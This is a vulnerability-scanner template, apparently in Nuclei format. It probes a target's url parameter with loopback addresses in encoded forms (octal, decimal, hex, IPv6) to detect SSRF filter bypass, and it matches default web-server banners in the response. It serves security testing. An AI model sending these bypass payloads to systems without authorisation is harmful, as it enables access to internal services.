id: whai-ssrf-localhost-bypass

info:
  name: SSRF Localhost via URL Bypass
  author: whitehat-ai
  severity: high
  description: Tests SSRF filter bypass with IP encoding tricks
  tags: ssrf,bypass,high
  classification:
    cwe-id: CWE-918

http:
  - method: GET
    path:
      - "{{BaseURL}}/?url=http://127.0.0.1"
      - "{{BaseURL}}/?url=http://[::1]"
      - "{{BaseURL}}/?url=http://0177.0.0.1"
      - "{{BaseURL}}/?url=http://2130706433"
      - "{{BaseURL}}/?url=http://0x7f000001"

    matchers:
      - type: regex
        part: body
        regex:
          - "(?i)(it works!|welcome to nginx|apache)"
        condition: or
